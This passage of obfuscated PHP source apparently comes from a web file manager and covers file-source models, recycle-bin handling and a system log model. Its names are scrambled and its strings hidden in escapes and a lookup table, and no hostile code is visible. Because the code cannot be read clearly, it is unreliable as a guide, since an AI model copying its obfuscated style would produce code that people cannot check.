$¼‡ªş°û[$›åîÎÑ”[505]], $›åîÎÑ”[430] => intval($¼‡ªş°û[$›åîÎÑ”[431]]), $›åîÎÑ”[583] => 1); $¬Â´÷€‚ = $this->where($¯¢®íßÙ)->count(); $áí–úèÒ = $this->where($¯¢®íßÙ)->where(array($›åîÎÑ”[583] => 0))->count(); return array($›åîÎÑ”[80] => $áí–úèÒ, $›åîÎÑ”[81] => $¬Â´÷€‚); } public function pathInfo($¿¼ÊÑ™Ë, $Èµ¥¥Ë” = false) { $°Á…ÃĞª =& $_SERVER[óó‹¸‚å]; $Èµ¥¥Ë” = !1; $¿¼ÊÑ™Ë = intval($¿¼ÊÑ™Ë); $¢½êéè… = $°Á…ÃĞª[461] . intval($Èµ¥¥Ë”) . $°Á…ÃĞª[386] . $¿¼ÊÑ™Ë; $œö²Ö½ù = _get(self::$cachePathInfo, $¢½êéè…); if ($œö²Ö½ù) { return $œö²Ö½ù; } $²‹Ãüê§ = $this->sourceInfo($¿¼ÊÑ™Ë); if (!$²‹Ãüê§) { return !1; } $²‹Ãüê§ = $this->_listDataApplyItem($²‹Ãüê§, $Èµ¥¥Ë”); self::$cachePathInfo[$¢½êéè…] = $²‹Ãüê§; return $²‹Ãüê§; } public static $cachePathInfoMore = array(); public function pathInfoMore($¯¼ï¢ÀØ) { $ÔËàÇ± =& $_SERVER[óó‹¸‚å]; $Ìñ®®Ÿ = _get(self::$cachePathInfoMore, $¯¼ï¢ÀØ); if ($Ìñ®®Ÿ) { return $Ìñ®®Ÿ; } $´¼®±‘ = $this->pathInfo($¯¼ï¢ÀØ); if (!$´¼®±‘) { return !1; } if ($´¼®±‘[$ÔËàÇ±[410]] == $ÔËàÇ±[88]) { $´¼®±‘[$ÔËàÇ±[79]] = $this->folderChildrenNumber($¯¼ï¢ÀØ); } self::$cachePathInfoMore[$¯¼ï¢ÀØ] = $´¼®±‘; return $´¼®±‘; } public function sourceInfo($öÄ°û«ƒ) { $ğ’ÖÆ©À =& $_SERVER[óó‹¸‚å]; if (!$öÄ°û«ƒ) { return array(); } $öÄ°û«ƒ = intval($öÄ°û«ƒ); $şÈæú¦— = $ğ’ÖÆ©À[460] . $öÄ°û«ƒ; $†Ã¢Š¨ = _get(self::$cacheSourceInfo, $şÈæú¦—); if ($†Ã¢Š¨) { return $†Ã¢Š¨; } $¹ÄõŒ¢ˆ = $this->where(array($ğ’ÖÆ©À[402] => $öÄ°û«ƒ))->find(); self::$cacheSourceInfo[$şÈæú¦—] = $¹ÄõŒ¢ˆ; return self::$cacheSourceInfo[$şÈæú¦—]; } public function sourceCacheClear($ÏÖÊÛšè = false) { self::cacheClear($ÏÖÊÛšè); } public static function cacheClear($€ü½„·“ = false) { $Óğ‡À =& $_SERVER[óó‹¸‚å]; if ($€ü½„·“ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Óğ‡À[460] . $€ü½„·“]); unset(self::$cachePathInfoMore[$€ü½„·“]); unset(self::$cachePathInfo[$Óğ‡À[2161] . $€ü½„·“]); unset(self::$cachePathInfo[$Óğ‡À[2162] . $€ü½„·“]); } public function metaSet($øÊ¸‚ƒÖ, $¨ØÛÍü = null, $—¡Ÿ•‡Ù = null) { $ËÆšºÄ° = parent::metaSet($øÊ¸‚ƒÖ, $¨ØÛÍü, $—¡Ÿ•‡Ù); if ($ËÆšºÄ°) { $this->sourceCacheClear($øÊ¸‚ƒÖ); } return $ËÆšºÄ°; } public function pathInfoByPath($Î§óÆ©ª, $Å¤Õ˜à¡) { $’¥­×ñç =& $_SERVER[óó‹¸‚å]; $ì›€§¨Ú = !$Å¤Õ˜à¡ ? array() : explode($’¥­×ñç[8], trim($Å¤Õ˜à¡, $’¥­×ñç[8])); $£Ì‹Ï‘  = $Î§óÆ©ª; foreach ($ì›€§¨Ú as $‡íùœôŞ) { $ŸÈÛÃıâ = array($’¥­×ñç[432] => $£Ì‹Ï‘ , $’¥­×ñç[32] => $‡íùœôŞ); $àŞ—ƒ® = $this->where($ŸÈÛÃıâ)->select(); if (!$àŞ—ƒ®) { return !1; } $àŞ—ƒ® = array_sort_by($àŞ—ƒ®, $’¥­×ñç[431]); $£Ì‹Ï‘  = $àŞ—ƒ®[0][$’¥­×ñç[402]]; } return $this->pathInfo($£Ì‹Ï‘ , !0); } protected function updateModifyTime($šœ€È ») { $ùßÄ©ş =& $_SERVER[óó‹¸‚å]; $­©èçĞ» = defined($ùßÄ©ş[475]) ? USER_ID : $ùßÄ©ş[197]; if (!$šœ€È ») { return; } if (!is_array($šœ€È »)) { $šœ€È » = array($šœ€È »); } foreach ($šœ€È » as $ŸÈİì‡ß => $ÁßÌéà×) { $šœ€È »[$ŸÈİì‡ß] = intval($ÁßÌéà×); $this->sourceCacheClear($ÁßÌéà×); } $ºÓĞÕ» = array($ùßÄ©ş[402] => array($ùßÄ©ş[7], $šœ€È »)); $€ „«×Ö = array($ùßÄ©ş[589] => $­©èçĞ», $ùßÄ©ş[424] => time()); $this->where($ºÓĞÕ»)->save($€ „«×Ö); } public function folderSizeReset($ºÙº»íŞ, $×ê­ë¸• = false) { $åô‡¦—® =& $_SERVER[óó‹¸‚å]; if ($this->statusIgnoreResetSpace) { return; } $‚§¤œŸİ = $this->sourceInfo($ºÙº»íŞ); $÷ê»‘úÄ = $åô‡¦—®[2163] . $ºÙº»íŞ; CacheLock::lock($÷ê»‘úÄ, 20); if ($×ê­ë¸• === !1) { $this->sourceCacheClear($ºÙº»íŞ); $‚§¤œŸİ = $this->sourceInfo($ºÙº»íŞ); $ûËƒ™ŞÈ = array($åô‡¦—®[401] => $ºÙº»íŞ, $åô‡¦—®[430] => 0); $õ”íÆ¤ƒ = $this->where($ûËƒ™ŞÈ)->sum($åô‡¦—®[76]); $×ê­ë¸• = intval($õ”íÆ¤ƒ) - intval($‚§¤œŸİ[$åô‡¦—®[76]]); } if ($×ê­ë¸• == 0) { return CacheLock::unlock($÷ê»‘úÄ); } $£‚›åÚü = $this->parentLevelArray($‚§¤œŸİ[$åô‡¦—®[521]]); if (!$£‚›åÚü) { $£‚›åÚü = array(); } $£‚›åÚü[] = $‚§¤œŸİ[$åô‡¦—®[402]]; $ûËƒ™ŞÈ = array($åô‡¦—®[402] => array($åô‡¦—®[418], $£‚›åÚü)); if ($×ê­ë¸• < 0) { $ûËƒ™ŞÈ[$åô‡¦—®[76]] = array($åô‡¦—®[1022], abs($×ê­ë¸•)); } $this->where($ûËƒ™ŞÈ)->setAdd($åô‡¦—®[76], $×ê­ë¸•); CacheLock::unlock($÷ê»‘úÄ); $Ûªú»Œ» = $åô‡¦—®[2164] . $‚§¤œŸİ[$åô‡¦—®[411]] . $åô‡¦—®[4] . $‚§¤œŸİ[$åô‡¦—®[505]]; $¹ùà™„ = array($‚§¤œŸİ[$åô‡¦—®[411]], $‚§¤œŸİ[$åô‡¦—®[505]]); TaskRun::timeLimitCall($Ûªú»Œ», $åô‡¦—®[2165], $¹ùà™„, 1.5); } public function folderSizeResetChildren($¢ÅØ‘–) { $÷£ŸÁ =& $_SERVER[óó‹¸‚å]; $this->sourceCacheClear($¢ÅØ‘–); $ÑìóÅì = $this->sourceInfo($¢ÅØ‘–); $‚ú³Êâ = array($÷£ŸÁ[583] => 1, $÷£ŸÁ[587] => $ÑìóÅì[$÷£ŸÁ[505]], $÷£ŸÁ[590] => array($÷£ŸÁ[550], $ÑìóÅì[$÷£ŸÁ[521]] . $¢ÅØ‘– . $÷£ŸÁ[551])); $ë›ÂªÙû = $÷£ŸÁ[2166]; $¹İíÙ¨§ = $this->field($ë›ÂªÙû)->where($‚ú³Êâ)->select(); $‚ú³Êâ[$÷£ŸÁ[410]] = 0; $ÜÕôšå = $this->field($ë›ÂªÙû)->where($‚ú³Êâ)->select(); if (!$ÜÕôšå) { return; } $¹İíÙ¨§[] = $ÑìóÅì; $¹İíÙ¨§ = array_to_keyvalue($¹İíÙ¨§, $÷£ŸÁ[402]); foreach ($¹İíÙ¨§ as $¦ĞÏŠŞ => $€şÜµœ) { $¹İíÙ¨§[$¦ĞÏŠŞ][$÷£ŸÁ[2167]] = $¹İíÙ¨§[$¦ĞÏŠŞ][$÷£ŸÁ[76]]; $¹İíÙ¨§[$¦ĞÏŠŞ][$÷£ŸÁ[76]] = 0; } foreach ($ÜÕôšå as $€şÜµœ) { $®¿°‹ï = $€şÜµœ[$÷£ŸÁ[432]] . $÷£ŸÁ[12]; if (!isset($¹İíÙ¨§[$®¿°‹ï])) { continue; } if ($€şÜµœ[$÷£ŸÁ[431]] == $¹İíÙ¨§[$®¿°‹ï][$÷£ŸÁ[431]]) { $¹İíÙ¨§[$®¿°‹ï][$÷£ŸÁ[76]] += $€şÜµœ[$÷£ŸÁ[76]]; } } foreach ($¹İíÙ¨§ as $€şÜµœ) { $şÅïÌ¯Ã = $this->parentLevelArray($€şÜµœ[$÷£ŸÁ[521]]); foreach ($şÅïÌ¯Ã as $®¿°‹ï) { $®¿°‹ï = $®¿°‹ï . $÷£ŸÁ[12]; if (!isset($¹İíÙ¨§[$®¿°‹ï])) { continue; } if ($€şÜµœ[$÷£ŸÁ[431]] == $¹İíÙ¨§[$®¿°‹ï][$÷£ŸÁ[431]]) { $¹İíÙ¨§[$®¿°‹ï][$÷£ŸÁ[76]] += $€şÜµœ[$÷£ŸÁ[76]]; } } } $Š¯ıÆ’» = array(); foreach ($¹İíÙ¨§ as $€şÜµœ) { if ($€şÜµœ[$÷£ŸÁ[76]] == $€şÜµœ[$÷£ŸÁ[2167]]) { continue; } $Š¯ıÆ’»[] = array($÷£ŸÁ[402], $€şÜµœ[$÷£ŸÁ[402]], $÷£ŸÁ[76], $€şÜµœ[$÷£ŸÁ[76]]); } $this->saveAll($Š¯ıÆ’»); } public function userSpaceReset($—›å¶‚Å = false) { $ù†»¢•ş =& $_SERVER[óó‹¸‚å]; $‚ÉÚ¦ıò = $this->where(array($ù†»¢•ş[411] => self::TYPE_USER, $ù†»¢•ş[505] => $—›å¶‚Å, $ù†»¢•ş[410] => 0))->sum($ù†»¢•ş[76]); $‚ÉÚ¦ıò = !$‚ÉÚ¦ıò || $‚ÉÚ¦ıò <= 0 ? 0 : $‚ÉÚ¦ıò; Model($ù†»¢•ş[513])->userEdit($—›å¶‚Å, array($ù†»¢•ş[1852] => $‚ÉÚ¦ıò)); } public function targetSpaceUpdate($Èü÷ Êª, $Ç¸‰¢•) { $—çÁ®œŸ =& $_SERVER[óó‹¸‚å]; if (!$Ç¸‰¢•) { return; } if (!in_array($Èü÷ Êª, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ıÏë‰ÏÏ = $this->targetSpaceSize($Èü÷ Êª, $Ç¸‰¢•); if ($Èü÷ Êª == self::TYPE_USER) { Model($—çÁ®œŸ[513])->userEdit($Ç¸‰¢•, array($—çÁ®œŸ[1852] => $ıÏë‰ÏÏ)); } else { if ($Èü÷ Êª == self::TYPE_GROUP) { Model($—çÁ®œŸ[522])->groupEdit($Ç¸‰¢•, array($—çÁ®œŸ[1852] => $ıÏë‰ÏÏ)); } } } public function targetSpaceSize($á¼Ú¨¹‹, $ÚçöĞƒµ) { $¥ãòåÀ³ =& $_SERVER[óó‹¸‚å]; $’™½ê„Ğ = 0; $ÃÅÇ°™ = $this->targetSourceRoot($á¼Ú¨¹‹, $ÚçöĞƒµ, !0); foreach ($ÃÅÇ°™ as $œõÖ¹ºƒ) { if (!$œõÖ¹ºƒ) { continue; } $’™½ê„Ğ += floatval($œõÖ¹ºƒ[$¥ãòåÀ³[76]]); $Ì©«’çˆ = array($¥ãòåÀ³[590] => array($¥ãòåÀ³[550], $¥ãòåÀ³[531] . $œõÖ¹ºƒ[$¥ãòåÀ³[402]] . $¥ãòåÀ³[551])); $ã´ƒì•¶ = Model($¥ãòåÀ³[429])->field($¥ãòåÀ³[417])->where($Ì©«’çˆ)->select(); $ã´ƒì•¶ = array_to_keyvalue($ã´ƒì•¶, $¥ãòåÀ³[12], $¥ãòåÀ³[402]); $ã´ƒì•¶ = array_unique(array_filter($ã´ƒì•¶)); if ($ã´ƒì•¶) { $Ì©«’çˆ = array($¥ãòåÀ³[417] => array($¥ãòåÀ³[418], $ã´ƒì•¶)); $’™½ê„Ğ += floatval($this->where($Ì©«’çˆ)->sum($¥ãòåÀ³[76])); } } $’™½ê„Ğ = !$’™½ê„Ğ || $’™½ê„Ğ <= 0 ? 0 : $’™½ê„Ğ; return $’™½ê„Ğ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Âò´ôïú) { return $this->fileTypeProfile($Âò´ôïú, SourceModel::TYPE_USER); } public function groupFileTypeProfile($§¸å‡ˆø) { return $this->fileTypeProfile($§¸å‡ˆø, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ìµïÈı¬, $ˆ¬˜æ»—) { $ÙåÒ®í¥ =& $_SERVER[óó‹¸‚å]; $ŒË×¤ú· = $ÙåÒ®í¥[2168] . $ìµïÈı¬ . $ÙåÒ®í¥[11] . $ˆ¬˜æ»—; $â²©‹˜Ç = Cache::get($ŒË×¤ú·); if ($â²©‹˜Ç) { return $â²©‹˜Ç; } $ÎööÛø¢ = array($ÙåÒ®í¥[583] => 0); if ($ìµïÈı¬ != !1) { $ÎööÛø¢[$ÙåÒ®í¥[505]] = $ìµïÈı¬; $ÎööÛø¢[$ÙåÒ®í¥[411]] = $ˆ¬˜æ»—; } $ÛÕãìˆ” = array(); $ÛÕãìˆ”[$ÙåÒ®í¥[2169]] = array($ÙåÒ®í¥[2170] => LNG($ÙåÒ®í¥[2169]), $ÙåÒ®í¥[2171] => $this->where($ÎööÛø¢)->count(), $ÙåÒ®í¥[585] => $this->where($ÎööÛø¢)->sum($ÙåÒ®í¥[76])); $ñŒà¦Ì„ = KodIO::fileTypeList(); foreach ($ñŒà¦Ì„ as $Öš±‘ª­ => $‹ÂÒ–Õú) { $ÎööÛø¢[$ÙåÒ®í¥[412]] = $this->fileTypeWhere($Öš±‘ª­); $ÛÕãìˆ”[$Öš±‘ª­] = array($ÙåÒ®í¥[2170] => $‹ÂÒ–Õú[$ÙåÒ®í¥[32]], $ÙåÒ®í¥[2171] => $this->where($ÎööÛø¢)->count(), $ÙåÒ®í¥[585] => $this->where($ÎööÛø¢)->sum($ÙåÒ®í¥[76])); } Cache::set($ŒË×¤ú·, $ÛÕãìˆ”, 1200); return $ÛÕãìˆ”; } public function fileNameExist($åæï®›, $¨Óêş«ì) { $Æ¤¹³üÑ =& $_SERVER[óó‹¸‚å]; $ê±ÚìÉƒ = $this->where(array($Æ¤¹³üÑ[432] => $åæï®›, $Æ¤¹³üÑ[32] => $¨Óêş«ì, $Æ¤¹³üÑ[431] => 0))->find(); return is_array($ê±ÚìÉƒ) ? $ê±ÚìÉƒ[$Æ¤¹³üÑ[402]] : !1; } public function childList($À™£õéŸ) { $µéÊÔ¬ =& $_SERVER[óó‹¸‚å]; $“×¢çû— = $µéÊÔ¬[2145] . $À™£õéŸ; if (isset(self::$cacheChildList[$“×¢çû—])) { return self::$cacheChildList[$“×¢çû—]; } $óĞ¨£½â = array($µéÊÔ¬[432] => intval($À™£õéŸ), $µéÊÔ¬[431] => 0); $½‘õ¯íš = $this->where($óĞ¨£½â)->select(); $½‘õ¯íš = $½‘õ¯íš ? $½‘õ¯íš : array(); self::$cacheChildList[$“×¢çû—] = $½‘õ¯íš; foreach ($½‘õ¯íš as $ĞƒİèÉÃ) { $“×¢çû— = $µéÊÔ¬[460] . $ĞƒİèÉÃ[$µéÊÔ¬[402]]; self::$cacheSourceInfo[$“×¢çû—] = $ĞƒİèÉÃ; } return $½‘õ¯íš; } public function fileNameAuto($íÀÈçİä, $ßìª†²Œ, $Åæòˆ©º = REPEAT_RENAME, $Íïà‚Ê› = false) { $¼¥¦ß =& $_SERVER[óó‹¸‚å]; $©ÑŞºÔ = get_path_ext($ßìª†²Œ); $î÷ê‰€ö = $©ÑŞºÔ ? basename($ßìª†²Œ, $¼¥¦ß[10] . $©ÑŞºÔ) . $¼¥¦ß[2172] . $©ÑŞºÔ : $ßìª†²Œ . $¼¥¦ß[384]; $Ø›”ƒ© = array($¼¥¦ß[432] => $íÀÈçİä, $¼¥¦ß[431] => 0, $¼¥¦ß[32] => array($¼¥¦ß[383], $î÷ê‰€ö)); $íÊ„Â®« = $this->field($¼¥¦ß[32])->where($Ø›”ƒ©)->select(); $ë’ˆµ›¥ = array_to_keyvalue($íÊ„Â®«, $¼¥¦ß[12], $¼¥¦ß[32]); return $this->fileNameAutoGet($ë’ˆµ›¥, $ßìª†²Œ, $Åæòˆ©º, $Íïà‚Ê›); } public function fileNameAutoGet($Á¨Ì¶Ó±, $ôÈİ, $ÅøËÁŸ­, $’Ê¬²Õ„) { $Şôİéë­ =& $_SERVER[óó‹¸‚å]; if ($ÅøËÁŸ­ == REPEAT_REPLACE || !$Á¨Ì¶Ó± || !in_array_not_case($ôÈİ, $Á¨Ì¶Ó±) || $’Ê¬²Õ„ && $ÅøËÁŸ­ != REPEAT_RENAME_FOLDER) { return $ôÈİ; } if ($ÅøËÁŸ­ == REPEAT_SKIP) { return !1; } $‡ìÊ´Ø = $Şôİéë­[10] . get_path_ext($ôÈİ); $‡ìÊ´Ø = $‡ìÊ´Ø == $Şôİéë­[10] || $’Ê¬²Õ„ ? $Şôİéë­[12] : $‡ìÊ´Ø; for ($ªÎû‹Ú‹ = 1; $ªÎû‹Ú‹ <= count($Á¨Ì¶Ó±) + 1; $ªÎû‹Ú‹++) { $£õ«È = substr($ôÈİ, 0, strlen($ôÈİ) - strlen($‡ìÊ´Ø)); $²€ ù¸ = $£õ«È . "\50{$ªÎû‹Ú‹}\51{$‡ìÊ´Ø}"; if (!in_array_not_case($²€ ù¸, $Á¨Ì¶Ó±)) { return $²€ ù¸; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\x65\x5f\x72\x65\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\124\x69\x6d\145", "\x74\x69\x6d\x65", "\151\156\163\145\x72\x74", "\x66\165\156\x63\x74\151\157\x6e")); public function listData($Û×àéÒ = false) { $ÕÊ´¤ùØ =& $_SERVER[óó‹¸‚å]; $Û×àéÒ = $Û×àéÒ ? $Û×àéÒ : USER_ID; $ÓÊ”æÑğ = $this->where(array($ÕÊ´¤ùØ[1665] => $Û×àéÒ))->select(); return array_to_keyvalue($ÓÊ”æÑğ, $ÕÊ´¤ùØ[12], $ÕÊ´¤ùØ[402]); } public function moveToRecycle($ŒÉæ·˜Å) { $Å¯¯«ˆ‰ =& $_SERVER[óó‹¸‚å]; $Ö“Ç½ = Model($Å¯¯«ˆ‰[1343]); $üá‰Ïš› = $Ö“Ç½->sourceInfo($ŒÉæ·˜Å); if (!$üá‰Ïš› || $üá‰Ïš›[$Å¯¯«ˆ‰[431]] == $Å¯¯«ˆ‰[88]) { return; } $€¾ìç†™ = array($Å¯¯«ˆ‰[417] => $ŒÉæ·˜Å, $Å¯¯«ˆ‰[1665] => USER_ID, $Å¯¯«ˆ‰[586] => $üá‰Ïš›[$Å¯¯«ˆ‰[411]], $Å¯¯«ˆ‰[587] => $üá‰Ïš›[$Å¯¯«ˆ‰[505]], $Å¯¯«ˆ‰[590] => $üá‰Ïš›[$Å¯¯«ˆ‰[521]]); $this->add($€¾ìç†™); $this->recycleMove($ŒÉæ·˜Å, 1); if ($üá‰Ïš›[$Å¯¯«ˆ‰[410]] == $Å¯¯«ˆ‰[88]) { $çœæ¹é = array($Å¯¯«ˆ‰[590] => array($Å¯¯«ˆ‰[550], $üá‰Ïš›[$Å¯¯«ˆ‰[521]] . $ŒÉæ·˜Å . $Å¯¯«ˆ‰[551])); $Ö“Ç½->where($çœæ¹é)->setField($Å¯¯«ˆ‰[431], 1); } } public function clear() { $this->remove(!1); } public function remove($äµÛ»à = false, $—½³åä = false) { $“¾‰ÎÑá =& $_SERVER[óó‹¸‚å]; $—½³åä = $—½³åä ? $—½³åä : USER_ID; $÷ñÇ¿ğå = Model($“¾‰ÎÑá[1343]); $úÂ©¬¸ğ = $this->listData($—½³åä); $äµÛ»à = $äµÛ»à === !1 ? !1 : $äµÛ»à; $Ü³É¼Ó = array(); foreach ($úÂ©¬¸ğ as $ä‹œéû‰) { if ($äµÛ»à != !1 && !in_array($ä‹œéû‰, $äµÛ»à)) { continue; } $íĞÕÍÖ½ = $÷ñÇ¿ğå->sourceInfo($ä‹œéû‰); $÷ñÇ¿ğå->remove($ä‹œéû‰, !1); $Ÿóêìá× = $íĞÕÍÖ½[$“¾‰ÎÑá[411]] . $“¾‰ÎÑá[11] . $íĞÕÍÖ½[$“¾‰ÎÑá[505]]; $Ü³É¼Ó[$Ÿóêìá×] = array($“¾‰ÎÑá[586] => $íĞÕÍÖ½[$“¾‰ÎÑá[411]], $“¾‰ÎÑá[505] => $íĞÕÍÖ½[$“¾‰ÎÑá[505]]); $this->where(array($“¾‰ÎÑá[402] => $ä‹œéû‰))->delete(); } foreach ($Ü³É¼Ó as $éŒ°Â…İ) { $÷ñÇ¿ğå->targetSpaceUpdate($éŒ°Â…İ[$“¾‰ÎÑá[411]], $éŒ°Â…İ[$“¾‰ÎÑá[505]]); } } public function restore($°³Ã¤õÈ = false) { $ğû¥ÔÂè = $this->listData(); $this->_restoreSource($ğû¥ÔÂè, $°³Ã¤õÈ); } public function removeUserAll($Õ‡­»İÅ) { $this->remove(!1, $Õ‡­»İÅ); } private function _restoreSource($¡“ğ½”, $Š·™¤¢®) { $»ú¸Ãì =& $_SERVER[óó‹¸‚å]; $–ò‡ûèî = Model($»ú¸Ãì[1343]); $Š·™¤¢® = $Š·™¤¢® == !1 ? !1 : $Š·™¤¢®; if (!$¡“ğ½”) { return !0; } $¯›¦ëêÎ = array(); foreach ($¡“ğ½” as $ÊÂùÑ¯) { if ($Š·™¤¢® != !1 && !in_array($ÊÂùÑ¯, $Š·™¤¢®)) { continue; } $²×Ô = $–ò‡ûèî->sourceInfo($ÊÂùÑ¯); $×‰¹¹Ì“ = $–ò‡ûèî->sourceInfo($²×Ô[$»ú¸Ãì[432]]); if ($×‰¹¹Ì“[$»ú¸Ãì[431]] == $»ú¸Ãì[88]) { continue; } $–ò‡ûèî->lockMoveStart($ÊÂùÑ¯); $this->recycleMove($ÊÂùÑ¯, 0); if ($²×Ô[$»ú¸Ãì[410]] == $»ú¸Ãì[88]) { $ø¶È¯Êğ = array($»ú¸Ãì[590] => array($»ú¸Ãì[550], $²×Ô[$»ú¸Ãì[521]] . $ÊÂùÑ¯ . $»ú¸Ãì[551])); $–ò‡ûèî->where($ø¶È¯Êğ)->setField($»ú¸Ãì[431], 0); $this->restoreFolderChildren($ÊÂùÑ¯, $¡“ğ½”); } $this->where(array($»ú¸Ãì[402] => $ÊÂùÑ¯))->delete(); $–ò‡ûèî->folderSizeReset($²×Ô[$»ú¸Ãì[432]]); $¯›¦ëêÎ[] = $²×Ô[$»ú¸Ãì[432]]; if ($²×Ô[$»ú¸Ãì[410]] == $»ú¸Ãì[88]) { $¯›¦ëêÎ[] = $ÊÂùÑ¯; } $–ò‡ûèî->lockMoveEnd($ÊÂùÑ¯); } $–ò‡ûèî->updateModifyTime($¯›¦ëêÎ); } private function restoreFolderChildren($ıØ¿Öé›, $ç÷Í»Ç) { $¬¼¤’üÓ =& $_SERVER[óó‹¸‚å]; $É¶æÑš¼ = Model($¬¼¤’üÓ[1343]); $Õ²ñü³ = array($¬¼¤’üÓ[402] => array($¬¼¤’üÓ[7], array())); foreach ($ç÷Í»Ç as $­Ç€„Ã‡) { if ($­Ç€„Ã‡ == $ıØ¿Öé›) { continue; } if (!$É¶æÑš¼->isParentOf($ıØ¿Öé›, $­Ç€„Ã‡)) { continue; } $ƒ¦÷‹Ø = $É¶æÑš¼->sourceInfo($­Ç€„Ã‡); if ($ƒ¦÷‹Ø[$¬¼¤’üÓ[410]] == $¬¼¤’üÓ[88]) { $Õ²ñü³[] = array($¬¼¤’üÓ[590] => array($¬¼¤’üÓ[550], $ƒ¦÷‹Ø[$¬¼¤’üÓ[521]] . $­Ç€„Ã‡ . $¬¼¤’üÓ[551])); } else { $Õ²ñü³[$¬¼¤’üÓ[402]][1][] = $­Ç€„Ã‡; } } if (!$Õ²ñü³[$¬¼¤’üÓ[402]][1]) { unset($Õ²ñü³[$¬¼¤’üÓ[402]]); } if (!$Õ²ñü³) { return; } $Õ²ñü³[$¬¼¤’üÓ[402]][1] = array_unique($Õ²ñü³[$¬¼¤’üÓ[402]][1]); $Õ²ñü³[$¬¼¤’üÓ[1007]] = $¬¼¤’üÓ[1961]; $É¶æÑš¼->where($Õ²ñü³)->setField($¬¼¤’üÓ[431], 1); } private function recycleMove($ğ¿ÌèŸ, $ò¡„ñ‡ş = 1) { $ï¥£ÇÎÁ =& $_SERVER[óó‹¸‚å]; $´‘˜ú” = Model($ï¥£ÇÎÁ[1343]); $á¾ ñâò = Model($ï¥£ÇÎÁ[2173]); $ã»·ùù = array($ï¥£ÇÎÁ[402] => $ğ¿ÌèŸ); if ($ò¡„ñ‡ş) { $´‘˜ú”->where($ã»·ùù)->setField($ï¥£ÇÎÁ[431], 1); $á¾ ñâò->eventRecycle($ğ¿ÌèŸ, $ï¥£ÇÎÁ[2174]); } else { $ˆÊ·»¡‡ = $´‘˜ú”->where($ã»·ùù)->find(); $´‰©œò¼ = $ˆÊ·»¡‡[$ï¥£ÇÎÁ[410]] == $ï¥£ÇÎÁ[88]; $ø±·úË = $´‘˜ú”->fileNameAuto($ˆÊ·»¡‡[$ï¥£ÇÎÁ[432]], $ˆÊ·»¡‡[$ï¥£ÇÎÁ[32]], REPEAT_RENAME_FOLDER, $´‰©œò¼); if ($ø±·úË != $ˆÊ·»¡‡[$ï¥£ÇÎÁ[32]]) { $´‘˜ú”->rename($ğ¿ÌèŸ, $ø±·úË); } $´‘˜ú”->where($ã»·ùù)->setField($ï¥£ÇÎÁ[431], 0); $á¾ ñâò->eventRecycle($ğ¿ÌèŸ, $ï¥£ÇÎÁ[2175]); } } } goto B„Îù¨øª; a–Óß±¡…: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\164", "\x66\165\x6e\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÕğŸØÜ­ =& $_SERVER[óó‹¸‚å]; return array($ÕğŸØÜ­[2192] => LNG($ÕğŸØÜ­[2193]), $ÕğŸØÜ­[2194] => LNG($ÕğŸØÜ­[2195]), $ÕğŸØÜ­[1806] => LNG($ÕğŸØÜ­[2196]), $ÕğŸØÜ­[2197] => LNG($ÕğŸØÜ­[2198]), $ÕğŸØÜ­[2199] => LNG($ÕğŸØÜ­[2200]), $ÕğŸØÜ­[2201] => LNG($ÕğŸØÜ­[2202]), $ÕğŸØÜ­[2203] => LNG($ÕğŸØÜ­[2204]), $ÕğŸØÜ­[1836] => LNG($ÕğŸØÜ­[2204]), $ÕğŸØÜ­[1837] => LNG($ÕğŸØÜ­[2205]), $ÕğŸØÜ­[2206] => LNG($ÕğŸØÜ­[2207]), $ÕğŸØÜ­[2208] => LNG($ÕğŸØÜ­[2209]), $ÕğŸØÜ­[2210] => LNG($ÕğŸØÜ­[2211]), $ÕğŸØÜ­[2212] => LNG($ÕğŸØÜ­[2213]), $ÕğŸØÜ­[1834] => LNG($ÕğŸØÜ­[2214]), $ÕğŸØÜ­[2215] => LNG($ÕğŸØÜ­[2216]), $ÕğŸØÜ­[1841] => LNG($ÕğŸØÜ­[2217]), $ÕğŸØÜ­[2218] => LNG($ÕğŸØÜ­[2219]), $ÕğŸØÜ­[2220] => LNG($ÕğŸØÜ­[2221]), $ÕğŸØÜ­[2222] => LNG($ÕğŸØÜ­[2223]), $ÕğŸØÜ­[2224] => LNG($ÕğŸØÜ­[2225]), $ÕğŸØÜ­[1844] => LNG($ÕğŸØÜ­[2226]), $ÕğŸØÜ­[1845] => LNG($ÕğŸØÜ­[2227]), $ÕğŸØÜ­[2228] => LNG($ÕğŸØÜ­[2229]), $ÕğŸØÜ­[2230] => LNG($ÕğŸØÜ­[2231]), $ÕğŸØÜ­[2232] => LNG($ÕğŸØÜ­[2233]), $ÕğŸØÜ­[1839] => LNG($ÕğŸØÜ­[2234]), $ÕğŸØÜ­[2235] => LNG($ÕğŸØÜ­[2236]), $ÕğŸØÜ­[1838] => LNG($ÕğŸØÜ­[2237]), $ÕğŸØÜ­[2238] => LNG($ÕğŸØÜ­[2239]), $ÕğŸØÜ­[2240] => LNG($ÕğŸØÜ­[2241]), $ÕğŸØÜ­[2242] => LNG($ÕğŸØÜ­[2243]), $ÕğŸØÜ­[2244] => LNG($ÕğŸØÜ­[2244]), $ÕğŸØÜ­[2245] => LNG($ÕğŸØÜ­[1810]), $ÕğŸØÜ­[2246] => LNG($ÕğŸØÜ­[2247]), $ÕğŸØÜ­[2248] => LNG($ÕğŸØÜ­[2249]), $ÕğŸØÜ­[2250] => LNG($ÕğŸØÜ­[2251]), $ÕğŸØÜ­[2252] => LNG($ÕğŸØÜ­[2253]), $ÕğŸØÜ­[2254] => LNG($ÕğŸØÜ­[2255]), $ÕğŸØÜ­[2256] => LNG($ÕğŸØÜ­[2256]), $ÕğŸØÜ­[2257] => LNG($ÕğŸØÜ­[2258]), $ÕğŸØÜ­[2259] => 